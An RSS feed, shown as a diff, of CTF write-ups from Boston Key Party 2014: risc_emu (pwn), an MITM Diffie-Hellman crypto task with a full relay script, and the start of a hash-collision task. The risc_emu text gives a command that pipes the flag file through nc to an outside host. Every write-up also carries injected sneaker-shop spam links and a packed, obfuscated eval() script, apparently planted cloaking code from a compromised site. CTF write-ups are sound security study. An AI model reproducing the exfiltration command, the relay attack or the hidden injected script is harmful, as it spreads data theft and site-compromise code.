@@ -1,0 +1,257 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xml:base="https://ctfcrew.org"  xmlns:dc="http://purl.org/dc/elements/1.1/">
+<channel>
+ <title>BalalaikaCr3w - Boston Key Party 2014</title>
+ <link>https://ctfcrew.org/event/15</link>
+ <description></description>
+ <language>en</language>
+<item>
+ <title>risc_emu</title>
+ <link>https://ctfcrew.org/writeup/37</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/15&quot;&gt;Boston Key Party 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&lt;strong&gt;Task:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Pwning : 100&lt;/p&gt;&lt;p&gt;nobody cares about this service nc 54.218.22.41 4545&lt;/p&gt;&lt;p&gt;http://bostonkeyparty.net/challenges/emu-c7c4671145c5bb6ad48682ec0c58b831&lt;/p&gt;&lt;p&gt;&lt;!--break--&gt;&lt;strong&gt;Solution:&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Connected to the server I was prompted to enter some byte code of the RISC CPU in base64. OK, let&#039;s look at the executable through disasm magnifier. After downloading &lt;em&gt;file&lt;/em&gt; command said me that it is ELF for x86-64. I started reading opcodes in the binary and found that after decoding base64 input in this beautiful C++ code &lt;em&gt;memcpy&lt;/em&gt; betrayer is used to copy decoded data into some global buffer. Look at this (dump from my mind):&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/risc_emu1.png&quot; alt=&quot;&quot; height=&quot;140&quot; width=&quot;368&quot;&gt;&lt;/p&gt;&lt;p&gt;So, that&#039;s pretty easy to get what we need. Just send 152 bytes with special address on the end. The first byte of the buffer is checked for being greater or equal to 9, and after that &lt;em&gt;main::fun&lt;/em&gt; is called with &lt;em&gt;buffer + 1&lt;/em&gt; as the first parmeter.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/risc_emu2.png&quot; alt=&quot;&quot; height=&quot;347&quot; width=&quot;823&quot;&gt;&lt;/p&gt;&lt;p&gt;There is only one problem remained. This is the gap between the byte code buffer and the function pointer. After doing &lt;em&gt;memcpy&lt;/em&gt; our risc emulator checks that first 4 bytes of this gap still contain some cookie written in the beginning of the &lt;em&gt;main&lt;/em&gt; function. Here is the mind dump with the function producing this cookie:&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/risc_emu3.png&quot; alt=&quot;&quot; height=&quot;255&quot; width=&quot;486&quot;&gt;&lt;/p&gt;&lt;p&gt;Now we just need to brute force the server time (hope the server is properly synced) and run &lt;em&gt;system(&quot;cat key | nc ctfcrew.org 1337&quot;)&lt;/em&gt;. Or run &lt;em&gt;ls -al&lt;/em&gt; if you aren&#039;t assured about flag file name. See the full solution in the attachment.&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.sneakersbe.com/&quot;&gt;Authentic Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;http://www.sb-roscoff.fr/en/bdeibishop/releases&quot;&gt;Releases Nike Shoes&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Plain text icon&quot; title=&quot;text/plain&quot; src=&quot;/modules/file/icons/text-plain.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/fuck-the-emu.cpp_.txt&quot; type=&quot;text/plain; length=3216&quot;&gt;fuck-the-emu.cpp_.txt&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Wed, 05 Mar 2014 13:59:22 +0000</pubDate>
+ <dc:creator>villytiger</dc:creator>
+ <guid isPermaLink="false">37 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/37#comments</comments>
+</item>
+<item>
+ <title>MITM II: Electric Boogaloo (Crypto 200)</title>
+ <link>https://ctfcrew.org/writeup/31</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/crypto&quot;&gt;crypto&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/15&quot;&gt;Boston Key Party 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&lt;strong&gt;Task:&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;box-sizing: border-box; margin-bottom: 10px;&quot;&gt;Chisa and Arisu are trying to tell each other two halves of a very important secret! They think they&#039;re safe, because they know how cryptography works---but can you learn their terrible, terrible secret? They&#039;re available as services at 54.186.6.201:12346 and 54.186.6.201:12345 respectively.&lt;/p&gt;&lt;p style=&quot;box-sizing: border-box; margin-bottom: 10px;&quot;&gt;http://bostonkeyparty.net/challenges/mitm2-632e4ecc332baba0943a0c6471dec2c6.tar.bz2&lt;/p&gt;&lt;p style=&quot;box-sizing: border-box; margin-bottom: 10px;&quot;&gt;&lt;!--break--&gt;&lt;/p&gt;&lt;p style=&quot;box-sizing: border-box; margin-bottom: 10px;&quot;&gt;&lt;strong&gt;Solution:&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;box-sizing: border-box; margin-bottom: 10px;&quot;&gt;This was a nice task. Classic Man-in-the-Middle attack and nothing more. First, i downloaded source files (&lt;em&gt;They are attached to this article - mitm2.zip). &lt;/em&gt;There were four files in the archive: &lt;em&gt;arisu.py, chisa.py, mitmlib.py and&amp;nbsp;curve25519.py.&amp;nbsp;&lt;/em&gt;As you might guess,&amp;nbsp;&lt;em&gt;curve25519.py &lt;/em&gt;contains realization of the elliptic cryptography. So i decided to open &amp;nbsp;&lt;em&gt;arisu.py&lt;/em&gt;&amp;nbsp;and&lt;em&gt;&amp;nbsp;chisa.py&amp;nbsp;&lt;/em&gt;first, in hope, that they would contain source code of servers running in given ip-addresses. And they indeed contained it.&lt;/p&gt;&lt;p style=&quot;box-sizing: border-box; margin-bottom: 10px;&quot;&gt;Servers start:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;KEY = &quot;&quot;
+CHECK = &quot;&quot;
+
+if __name__ == &quot;__main__&quot;:
+    HOST = sys.argv[1]
+    PORT = int(sys.argv[2])
+
+    KEY = open(&#039;chisa.txt&#039;, &#039;r&#039;).read()[:-1]
+    CHECK = open(&#039;check.txt&#039;, &#039;r&#039;).read()[:-1]
+    server = ThreadedServer((HOST, PORT), ServerHandler)
+    server.allow_reuse_address = True
+    server.serve_forever()
+&lt;/pre&gt;&lt;p&gt;It&#039;s same for Arisu - only another key file.&lt;/p&gt;&lt;p&gt;And servers work:&lt;/p&gt;&lt;p&gt;Arisu:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;    def handle(self):
+        #if not self.captcha():
+            #return self.fail(&quot;You&#039;re a robot!&quot;)
+        self.request.sendall(&quot;アリスです&quot;)
+        if not (self.request.recv(50) == &quot;千佐だよ&quot;):
+            return self.fail(&quot;You&#039;re not Chisa!&quot;)
+
+        secretshare1, publicshare1 = mitmlib.mkshare()
+
+	to_send = str(publicshare1[0]) + &quot;,&quot; + str(publicshare1[1])
+        self.request.sendall(to_send)
+
+	got = self.request.recv(2048).split(&#039;,&#039;)
+        publicshare2 = tuple([int(got[0]), int(got[1])])
+        aeskey = mitmlib.mksecret(secretshare1, publicshare2)
+
+        slices = zip(CHECK[0::2], CHECK[1::2])
+        for a, b in slices:
+            self.request.sendall(mitmlib.encrypt(aeskey, a))
+            if b != mitmlib.decrypt(aeskey, self.request.recv(400)):
+                self.fail(&quot;That&#039;s wrong!&quot;)
+
+        self.request.sendall(mitmlib.encrypt(aeskey, &quot;FLAG PART ONE: {&quot; + KEY + &quot;}\n&quot;))
+	print mitmlib.decrypt(aeskey, self.request.recv(400))
+
+        self.request.sendall(mitmlib.encrypt(aeskey, &quot;じゃ!&quot;))
+        self.request.recv(100)
+        self.request.close()&lt;/pre&gt;&lt;p&gt;Chisa:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;    def handle(self):
+        #if not self.captcha():
+            #return self.fail(&quot;You&#039;re a robot!&quot;)
+        if not (self.request.recv(50) == &quot;アリスです&quot;):
+            return self.fail(&quot;You&#039;re not Alice!&quot;)
+        self.request.sendall(&quot;千佐だよ&quot;)
+
+        secretshare2, publicshare2 = mitmlib.mkshare()
+
+        got = self.request.recv(2048).split(&#039;,&#039;)
+        publicshare1 = tuple([int(got[0]), int(got[1])])
+
+        to_send = str(publicshare2[0]) + &quot;,&quot; + str(publicshare2[1])
+        self.request.sendall(to_send)
+        aeskey = mitmlib.mksecret(secretshare2, publicshare1)
+
+        slices = zip(CHECK[0::2], CHECK[1::2])
+        for a, b in slices:
+            if a != mitmlib.decrypt(aeskey, self.request.recv(400)):
+                self.fail(&quot;That&#039;s wrong!&quot;)
+            self.request.sendall(mitmlib.encrypt(aeskey, b))
+
+        print mitmlib.decrypt(aeskey, self.request.recv(400))
+        self.request.sendall(mitmlib.encrypt(aeskey, &quot;FLAG PART TWO: {&quot; + KEY + &quot;}\n&quot;))
+
+        self.request.recv(100)
+        self.request.sendall(mitmlib.encrypt(aeskey, &quot;じゃ!&quot;))
+        self.request.close()&lt;/pre&gt;&lt;p&gt;Thoose parts contain algorithm of conversation. At the beginning Arisu and Chisa send each other something like &quot;hello&quot;:&amp;nbsp;&lt;/p&gt;&lt;p&gt;Arisu:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;    self.request.sendall(&quot;アリスです&quot;)
+    if not (self.request.recv(50) == &quot;千佐だよ&quot;):
+        return self.fail(&quot;You&#039;re not Chisa!&quot;)&lt;/pre&gt;&lt;p&gt;Chisa:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;    if not (self.request.recv(50) == &quot;アリスです&quot;):
+        return self.fail(&quot;You&#039;re not Alice!&quot;)
+    self.request.sendall(&quot;千佐だよ&quot;)&lt;/pre&gt;&lt;p&gt;You might notice, that Arisu starts the conversation and Chisa only replies.&lt;/p&gt;&lt;p&gt;Next step is a public key exchange:&lt;/p&gt;&lt;p&gt;Arisu:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;    secretshare1, publicshare1 = mitmlib.mkshare()
+
+    to_send = str(publicshare1[0]) + &quot;,&quot; + str(publicshare1[1])
+    self.request.sendall(to_send)
+
+    got = self.request.recv(2048).split(&#039;,&#039;)
+    publicshare2 = tuple([int(got[0]), int(got[1])])
+    aeskey = mitmlib.mksecret(secretshare1, publicshare2)&lt;/pre&gt;&lt;p&gt;Chisa:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;    secretshare2, publicshare2 = mitmlib.mkshare()
+
+    got = self.request.recv(2048).split(&#039;,&#039;)
+        publicshare1 = tuple([int(got[0]), int(got[1])])
+
+    to_send = str(publicshare2[0]) + &quot;,&quot; + str(publicshare2[1])
+    self.request.sendall(to_send)
+    aeskey = mitmlib.mksecret(secretshare2, publicshare1)&lt;/pre&gt;&lt;p&gt;Girls just send a public key to each other and then calculate session key.&lt;/p&gt;&lt;p&gt;And the last part: they send some messages to each other, and the last but one contains a flag:&lt;/p&gt;&lt;p&gt;Arisu:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;        slices = zip(CHECK[0::2], CHECK[1::2])
+        for a, b in slices:
+            self.request.sendall(mitmlib.encrypt(aeskey, a))
+            if b != mitmlib.decrypt(aeskey, self.request.recv(400)):
+                self.fail(&quot;That&#039;s wrong!&quot;)
+
+        self.request.sendall(mitmlib.encrypt(aeskey, &quot;FLAG PART ONE: {&quot; + KEY + &quot;}\n&quot;))
+	print mitmlib.decrypt(aeskey, self.request.recv(400))
+
+        self.request.sendall(mitmlib.encrypt(aeskey, &quot;じゃ!&quot;))
+        self.request.recv(100)
+        self.request.close()&lt;/pre&gt;&lt;p&gt;Chisa:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;        slices = zip(CHECK[0::2], CHECK[1::2])
+        for a, b in slices:
+            if a != mitmlib.decrypt(aeskey, self.request.recv(400)):
+                self.fail(&quot;That&#039;s wrong!&quot;)
+            self.request.sendall(mitmlib.encrypt(aeskey, b))
+
+        print mitmlib.decrypt(aeskey, self.request.recv(400))
+        self.request.sendall(mitmlib.encrypt(aeskey, &quot;FLAG PART TWO: {&quot; + KEY + &quot;}\n&quot;))
+
+        self.request.recv(100)
+        self.request.sendall(mitmlib.encrypt(aeskey, &quot;じゃ!&quot;))
+        self.request.close()&lt;/pre&gt;&lt;p&gt;Now i&#039;ve found everythingi need to interfere in communication between Arisu and Chisa to steal a flag. I opened text editor and wrote python script. First, i generated my own key pair like Arisu and Chisa did:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;mySecretKey, myPublicKey = mitmlib.mkshare()&lt;/pre&gt;&lt;p&gt;Then i sent hello girls:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;Arisu = Sock(&quot;54.186.6.201:12345&quot;, timeout=30)
+Chisa = Sock(&quot;54.186.6.201:12346&quot;, timeout=30)
+
+hello = Arisu(1024)
+print &quot;=== Arisu ---&amp;gt; Chisa ===&quot;
+print &quot;Hello: &quot; + hello + &quot;\n&quot;
+Chisa.send(hello)
+sleep(0.25)
+
+hello = Chisa.recv(1024)
+print &quot;=== Arisu &amp;lt;--- Chisa ===&quot;
+print &quot;Hello: &quot; + hello + &quot;\n&quot;
+Arisu(hello)
+sleep(0.25)&lt;/pre&gt;&lt;p&gt;Next step: send my own public key to Chisa and Arisu instead of their own, save their keys and evaluate secret keys for each connection:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;ArisuPubKeyArr = Arisu.recv(1024).split(&#039;,&#039;)
+print &quot;=== Arisu ---&amp;gt; Chisa ===&quot;
+print &quot;Try to send: &quot; + str(ArisuPubKeyArr[0]) + &quot;,&quot; + str(ArisuPubKeyArr[1])
+print &quot;Really sent: &quot; + myPublicKeyStr + &quot;\n&quot;
+Chisa.send(myPublicKeyStr)
+sleep(0.25)
+
+ChisaPubKeyArr = Chisa.recv(1024).split(&#039;,&#039;)
+print &quot;=== Arisu &amp;lt;--- Chisa ===&quot;
+print &quot;Try to send: &quot; + str(ChisaPubKeyArr[0]) + &quot;,&quot; + str(ChisaPubKeyArr[1])
+print &quot;Really sent: &quot; + myPublicKeyStr + &quot;\n&quot;
+Arisu.send(myPublicKeyStr)
+sleep(0.25)&lt;br&gt;&lt;br&gt;ArisuPubKey = tuple([int(ArisuPubKeyArr[0]), int(ArisuPubKeyArr[1])])
+ChisaPubKey = tuple([int(ChisaPubKeyArr[0]), int(ChisaPubKeyArr[1])])
+
+ArisuAesKey = mitmlib.mksecret(mySecretKey, ArisuPubKey)
+ChisaAesKey = mitmlib.mksecret(mySecretKey, ChisaPubKey)&lt;/pre&gt;&lt;p&gt;And the last part: i have to recieve messages from Arisu, decrypt them on myArisu secret key, reencrypt them on myChisa secret key and send to Chisa, and i have to do the same thing for Chisa&#039;s messages:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;try:
+	for i in xrange(0,25,1):
+
+		some_slice = Arisu.recv(1024)
+		print &quot;=== Arisu ---&amp;gt; Chisa ===&quot;
+		print &quot;Try to send: &quot; + some_slice
+
+		decrypted_slice = mitmlib.decrypt(ArisuAesKey, some_slice)
+		encrypted_slice = mitmlib.encrypt(ChisaAesKey, decrypted_slice)
+
+		print &quot;Decrypted: &quot; + decrypted_slice
+		print &quot;Really sent: &quot; + encrypted_slice + &quot;\n&quot;
+
+		Chisa.send(encrypted_slice)
+		sleep(0.35)
+
+
+		some_slice = Chisa.recv(1024)
+		print &quot;=== Arisu &amp;lt;--- Chisa ===&quot;
+		print &quot;Try to send: &quot; + some_slice
+
+		decrypted_slice = mitmlib.decrypt(ChisaAesKey, some_slice)
+		encrypted_slice = mitmlib.encrypt(ArisuAesKey, decrypted_slice)
+
+		print &quot;Decrypted: &quot; + decrypted_slice
+		print &quot;Really sent: &quot; + encrypted_slice + &quot;\n&quot;
+
+		Arisu.send(encrypted_slice)
+		sleep(0.35)
+except Exception, e:
+	print e&lt;/pre&gt;&lt;p&gt;The last but one message for Arisu and Chisa is a part of flag:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;=== Arisu ---&amp;gt; Chisa ===
+Try to send: cSAt1FxoXq5dtROo6YL9VE/Ln95Gd/l6GxDSmsidTuAkbSANizH6b2Y1RXSwss0Z
+Decrypted: FLAG PART ONE: {I dunno, }
+
+Really sent: 4VW4ebDKPVXVDDzoiYjvjf1Q4VtX/pZP63WUrsRfqzRlEOCy0Q0ryOVFACILC0ai
+
+=== Arisu &amp;lt;--- Chisa ===
+Try to send: 3RZwKsSLLWMKwLlEr/h8X7xousf6B59UuiU+R+sMwL/uwHI2yY9KoyM9wpL/jsS4U4QlrcPzEiMrK7IMXFs38F8xEKilV6fx0DcnCs6ZvME=
+Decrypted: FLAG PART TWO: {go fanwank something!}
+
+Really sent: bqW46ykWazNT+gR9ykJHgAWNVa5HrrDhmzXNjekgpebPB43a+0y3bvFkaAZFCZdMP5pMpgpa/rUDX2gD01w5ItYcDLWQXzbpd4hO/OTr8Zg=&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Flag:&amp;nbsp;&lt;span style=&quot;font-family: Monaco, Menlo, Consolas, &#039;Courier New&#039;, monospace; font-size: 13px; white-space: pre-wrap;&quot;&gt;I dunno, &lt;/span&gt;&lt;span style=&quot;font-family: Monaco, Menlo, Consolas, &#039;Courier New&#039;, monospace; font-size: 13px; white-space: pre-wrap;&quot;&gt;go fanwank something!&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.jmksport.com/&quot;&gt;Sports brands&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.ietp.com/fr/dfecfyshop/products/air-jordan-1-retro-high-og-university-blue-555088-134&quot;&gt;Air Jordan 1 Retro High OG &#039;University Blue&#039; — Ietp&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-file field-type-file field-label-above&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Attachments:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Package icon&quot; title=&quot;application/zip&quot; src=&quot;/modules/file/icons/package-x-generic.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/mitm2.zip&quot; type=&quot;application/zip; length=7993&quot;&gt;mitm2.zip&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;span class=&quot;file&quot;&gt;&lt;img class=&quot;file-icon&quot; alt=&quot;Plain text icon&quot; title=&quot;text/plain&quot; src=&quot;/modules/file/icons/text-plain.png&quot; /&gt; &lt;a href=&quot;https://ctfcrew.org/sites/default/files/writeups/mitm.py.txt&quot; type=&quot;text/plain; length=2337&quot;&gt;mitm.py.txt&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Sat, 01 Mar 2014 22:32:47 +0000</pubDate>
+ <dc:creator>Triff</dc:creator>
+ <guid isPermaLink="false">31 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/31#comments</comments>
+</item>
+<item>
+ <title>Xorxes the Hash (Crypto 200)</title>
+ <link>https://ctfcrew.org/writeup/29</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/crypto&quot;&gt;crypto&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/15&quot;&gt;Boston Key Party 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;&lt;strong&gt;Task:&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;box-sizing: border-box; margin-bottom: 10px;&quot;&gt;Xorxes is a hash collision challenge. The goal is to find a second preimage for the input string &quot;Klaatubaradanikto&quot;. Submit it as the flag. UPDATE: It has been pointed out that there are multiple solutions. The flag is the one with md5sum &#039;7179926e4253a0b405090df67f62c543&#039;. (Use `echo -n FLAG | md5sum&#039;.) UPDATE THE SECOND: The solution is short.&lt;/p&gt;&lt;p style=&quot;box-sizing: border-box; margin-bottom: 10px;&quot;&gt;http://bostonkeyparty.net/challenges/xorxes-ad7b52380d3ec704b28954c80119789a.py&lt;/p&gt;&lt;p style=&quot;box-sizing: border-box; margin-bottom: 10px;&quot;&gt;&lt;!--break--&gt;&lt;/p&gt;&lt;p style=&quot;box-sizing: border-box; margin-bottom: 10px;&quot;&gt;&lt;strong&gt;Solution:&lt;/strong&gt;&lt;/p&gt;&lt;p style=&quot;box-sizing: border-box; margin-bottom: 10px;&quot;&gt;First, take a look on xorxes-hash sript. Inside we can find a comment about xorxes algorithm:&lt;/p&gt;&lt;pre class=&quot;brush: as3; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;# Xorxes Hash uses message blocks of 8-bits, with a 224-bit chaining variable.
+#
+#   (m_0)       (m_1)         ... (m_n)  = input message blocks
+#     |           |                 |
+#   SHA224      SHA224        ... SHA224    
+#     |           |                 |
+#  V-(+)-[&amp;gt;&amp;gt;&amp;gt;56]-(+)-[&amp;gt;&amp;gt;&amp;gt;56]- ... --+--- = chaining variable 
+#
+#  chaining variable + (message length mod 24) = hash output
